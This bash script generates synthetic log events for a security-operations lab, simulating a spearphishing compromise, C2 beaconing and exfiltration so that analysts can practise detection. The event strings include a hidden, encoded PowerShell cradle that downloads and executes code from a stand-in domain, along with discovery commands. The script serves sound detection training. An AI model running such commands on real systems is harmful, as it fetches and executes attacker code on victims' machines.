#!/usr/bin/env bash
# ============================================================================
# SOC Lab Docker – Command & Control Beacon Simulation
# ============================================================================
#
# Simulates a host compromised via spearphishing that executes an implant and
# begins persistent C2 callbacks to an attacker-controlled server.
#
# Event chain simulated:
#   1. Initial Access  – spearphishing doc opens, macro executes PowerShell
#   2. Download Cradle – PowerShell downloads implant payload from C2
#   3. DNS Resolution  – implant resolves C2 domain (DGA-style)
#   4. C2 Check-in     – initial registration beacon to C2 infrastructure
#   5. Beacon Loop     – periodic heartbeat connections (timing-based signature)
#   6. Task Execution  – C2 issues command; implant spawns cmd.exe
#   7. Data Exfil      – command output returned over C2 channel
#
# MITRE ATT&CK:
#   T1566.001 – Phishing: Spearphishing Attachment (initial access)
#   T1059.001 – Command and Scripting Interpreter: PowerShell
#   T1071.001 – Application Layer Protocol: Web Protocols (C2 comms)
#   T1029     – Scheduled Transfer (regular beacon timing)
#   T1041     – Exfiltration Over C2 Channel
#   T1132.001 – Data Encoding: Standard Encoding
#
# Usage:
#   bash scripts/c2_beacon_simulation.sh [options]
#
# Options (env vars):
#   IMPLANT_HOST       – Compromised host (default: workstation-07)
#   IMPLANT_USER       – Compromised user account (default: mwilson)
#   C2_IP              – C2 server IP (default: random external)
#   C2_PORT            – C2 server port (default: 443)
#   C2_DOMAIN          – C2 domain for DNS query (default: cdn-telemetry.net)
#   BEACON_COUNT       – Number of beacon heartbeats to simulate (default: 6)
#   BEACON_INTERVAL_MS – Milliseconds between beacons (default: 2000)
#   LOG_FILE           – Output log file (default: ./data/logs/attack-simulation.json)
#
# Expected detections:
#   - Suspicious parent-child: winword.exe → cmd.exe → powershell.exe
#   - PowerShell executing encoded/download command (T1059.001)
#   - Regular-interval outbound connections to single external IP (beaconing)
#   - Consistent small packet sizes to external destination
#   - Process (non-browser) making HTTPS connections to rare external IP
#
# See detections/ for matching queries.
# ============================================================================

set -euo pipefail
SCRIPT_NAME="c2_beacon_simulation"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/utils.sh"

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
IMPLANT_HOST="${IMPLANT_HOST:-workstation-07}"
IMPLANT_USER="${IMPLANT_USER:-mwilson}"
C2_IP="${C2_IP:-$(random_external_ip)}"
C2_PORT="${C2_PORT:-443}"
C2_DOMAIN="${C2_DOMAIN:-cdn-telemetry.net}"
BEACON_COUNT="${BEACON_COUNT:-6}"
BEACON_INTERVAL_MS="${BEACON_INTERVAL_MS:-2000}"
IMPLANT_PID=$((RANDOM % 50000 + 5000))
IMPLANT_PROC="svchost32.exe"
HOST_IP="$(random_internal_ip)"

# ---------------------------------------------------------------------------
# Pre-flight
# ---------------------------------------------------------------------------
log_info "============================================"
log_info "  C2 Beacon Simulation"
log_info "============================================"
log_info "Compromised host : ${IMPLANT_HOST} (${HOST_IP})"
log_info "Compromised user : ${IMPLANT_USER}"
log_info "C2 server        : ${C2_IP}:${C2_PORT} (${C2_DOMAIN})"
log_info "Beacon count     : ${BEACON_COUNT}"
log_info "Beacon interval  : ${BEACON_INTERVAL_MS}ms"
log_info "Implant process  : ${IMPLANT_PROC} [PID ${IMPLANT_PID}]"
log_info "Output file      : ${LOG_FILE}"
log_info "--------------------------------------------"

if ! check_lab_running 2>/dev/null; then
    log_warn "Lab not running. Events will be written to file only."
fi

# ---------------------------------------------------------------------------
# Step 1: Initial Access – spearphishing document opens macro
# ---------------------------------------------------------------------------
log_step "Step 1 – Initial access: spearphishing macro execution"

# winword.exe spawns cmd.exe (suspicious parent/child)
event=$(make_process_event "winword.exe" "cmd.exe" \
    "cmd.exe /c powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHQAZQBsAGUAbQBlAHQAcgB5AC4AbgBlAHQALwB1AHAAZABhAHQAZQAnACkA" \
    "$IMPLANT_USER" "$IMPLANT_HOST")
write_event "$event"
step_delay

# cmd.exe spawns powershell.exe
ps_cmdline="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHQAZQBsAGUAbQBlAHQAcgB5AC4AbgBlAHQALwB1AHAAZABhAHQAZQAnACkA"
event=$(make_process_event "cmd.exe" "powershell.exe" "$ps_cmdline" "$IMPLANT_USER" "$IMPLANT_HOST")
write_event "$event"

log_info "  → Initial access events written (winword → cmd → powershell)"
step_delay

# ---------------------------------------------------------------------------
# Step 2: Download Cradle – PowerShell retrieves implant from C2
# ---------------------------------------------------------------------------
log_step "Step 2 – Download cradle: implant retrieved from C2"

# DNS resolution before download
event=$(make_dns_event "$C2_DOMAIN" "$C2_IP" "$IMPLANT_HOST")
write_event "$event"

# Network event – PowerShell reaching out to C2 for payload (moderate size)
event=$(make_network_event "$HOST_IP" "$C2_IP" "$C2_PORT" "65536" "$IMPLANT_HOST")
write_event "$event"

# PowerShell drops and executes implant (unusual process in ProgramData)
ts=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat <<JSON | write_event "$(cat)"
{"@timestamp":"${ts}","event":{"category":["process"],"action":"process_started","outcome":"success","kind":"event","dataset":"soc-lab.process_execution","type":["start"]},"process":{"name":"${IMPLANT_PROC}","executable":"C:\\\\ProgramData\\\\MicrosoftUpdate\\\\${IMPLANT_PROC}","command_line":"${IMPLANT_PROC} --silent","pid":${IMPLANT_PID},"parent":{"name":"powershell.exe","pid":$((RANDOM % 60000 + 1000))}},"user":{"name":"${IMPLANT_USER}"},"host":{"name":"${IMPLANT_HOST}","os":{"type":"windows"}},"labels":{"lab":"soc-lab","synthetic":true,"simulation":"attack"}}
JSON

log_info "  → Implant download and execution events written"
step_delay

# ---------------------------------------------------------------------------
# Step 3: Initial C2 Check-in
# ---------------------------------------------------------------------------
log_step "Step 3 – Initial C2 check-in (implant registration)"

# DNS re-resolution at check-in (implant verifies C2 is reachable)
event=$(make_dns_event "$C2_DOMAIN" "$C2_IP" "$IMPLANT_HOST")
write_event "$event"

# Small initial registration packet
event=$(make_network_event "$HOST_IP" "$C2_IP" "$C2_PORT" "512" "$IMPLANT_HOST")
write_event "$event"

# C2 responds with task list (inbound, small)
ts=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat <<JSON | write_event "$(cat)"
{"@timestamp":"${ts}","event":{"category":["network"],"action":"network_flow","outcome":"success","kind":"event","dataset":"soc-lab.network"},"source":{"ip":"${C2_IP}","port":${C2_PORT},"bytes":256},"destination":{"ip":"${HOST_IP}","port":$((RANDOM % 60000 + 1024)),"bytes":2048},"network":{"transport":"tcp","direction":"inbound","bytes":2048},"host":{"name":"${IMPLANT_HOST}"},"labels":{"lab":"soc-lab","synthetic":true,"simulation":"attack"}}
JSON

log_info "  → Initial check-in events written"
step_delay

# ---------------------------------------------------------------------------
# Step 4: Beacon Loop – periodic heartbeat connections
# ---------------------------------------------------------------------------
log_step "Step 4 – Beacon loop: ${BEACON_COUNT} heartbeat pulses"

for i in $(seq 1 "$BEACON_COUNT"); do
    # Consistent ~512-byte payload (key beaconing indicator: uniform size + interval)
    event=$(make_network_event "$HOST_IP" "$C2_IP" "$C2_PORT" "512" "$IMPLANT_HOST")
    write_event "$event"

    if (( i % 2 == 0 )); then
        log_info "  → Beacon ${i}/${BEACON_COUNT} written"
    fi

    sleep "$(awk "BEGIN {printf \"%.3f\", $BEACON_INTERVAL_MS/1000}")"
done

log_info "  → All ${BEACON_COUNT} beacon pulses written"
step_delay

# ---------------------------------------------------------------------------
# Step 5: Task Execution – C2 issues command, implant runs it
# ---------------------------------------------------------------------------
log_step "Step 5 – Task execution: C2-issued command"

# Implant receives tasking (slightly larger inbound packet)
ts=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat <<JSON | write_event "$(cat)"
{"@timestamp":"${ts}","event":{"category":["network"],"action":"network_flow","outcome":"success","kind":"event","dataset":"soc-lab.network"},"source":{"ip":"${C2_IP}","port":${C2_PORT},"bytes":1024},"destination":{"ip":"${HOST_IP}","port":$((RANDOM % 60000 + 1024)),"bytes":128},"network":{"transport":"tcp","direction":"inbound","bytes":1024},"host":{"name":"${IMPLANT_HOST}"},"labels":{"lab":"soc-lab","synthetic":true,"simulation":"attack"}}
JSON

# Implant spawns cmd.exe to execute tasked command (unusual parent process)
ts=$(date -u '+%Y-%m-%dT%H:%M:%S.000Z')
cat <<JSON | write_event "$(cat)"
{"@timestamp":"${ts}","event":{"category":["process"],"action":"process_started","outcome":"success","kind":"event","dataset":"soc-lab.process_execution","type":["start"]},"process":{"name":"cmd.exe","executable":"C:\\\\Windows\\\\System32\\\\cmd.exe","command_line":"cmd.exe /c whoami && net user && ipconfig /all > C:\\\\ProgramData\\\\MicrosoftUpdate\\\\.tmp","pid":$((RANDOM % 60000 + 1000)),"parent":{"name":"${IMPLANT_PROC}","pid":${IMPLANT_PID}}},"user":{"name":"${IMPLANT_USER}"},"host":{"name":"${IMPLANT_HOST}","os":{"type":"windows"}},"labels":{"lab":"soc-lab","synthetic":true,"simulation":"attack"}}
JSON

# Discovery commands run via tasked shell
for cmd in "whoami.exe" "net.exe" "ipconfig.exe"; do
    event=$(make_process_event "cmd.exe" "$cmd" "$cmd" "$IMPLANT_USER" "$IMPLANT_HOST")
    write_event "$event"
    sleep 0.1
done

log_info "  → Task execution events written (${IMPLANT_PROC} → cmd.exe → discovery)"
step_delay

# ---------------------------------------------------------------------------
# Step 6: Data Exfiltration – command output returned over C2 channel
# ---------------------------------------------------------------------------
log_step "Step 6 – Exfiltration: command output sent to C2 over C2 channel"

# Output file read and encoded, then pushed back to C2 (larger outbound packet)
event=$(make_network_event "$HOST_IP" "$C2_IP" "$C2_PORT" "8192" "$IMPLANT_HOST")
write_event "$event"

# Follow-on beacon confirming exfil complete
event=$(make_network_event "$HOST_IP" "$C2_IP" "$C2_PORT" "512" "$IMPLANT_HOST")
write_event "$event"

log_info "  → Exfiltration events written (command output → C2)"

# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------
log_info "============================================"
log_info "  Simulation Complete"
log_info "============================================"
log_info "Output file : ${LOG_FILE}"
log_info ""
log_info "Expected detections:"
log_info "  - winword.exe → cmd.exe → powershell.exe chain (T1566.001)"
log_info "  - Encoded PowerShell command with -EncodedCommand flag (T1059.001)"
log_info "  - Process in ProgramData making outbound network connections"
log_info "  - Regular-interval connections to ${C2_IP}:${C2_PORT} (T1071.001)"
log_info "  - Uniform ~512-byte beacon packets (T1029)"
log_info "  - Non-browser process (${IMPLANT_PROC}) using HTTPS port"
log_info ""
log_info "Key fields to look for in Kibana:"
log_info "  destination.ip: ${C2_IP}"
log_info "  destination.port: ${C2_PORT}"
log_info "  process.parent.name: winword.exe OR ${IMPLANT_PROC}"
log_info "  process.name: powershell.exe"
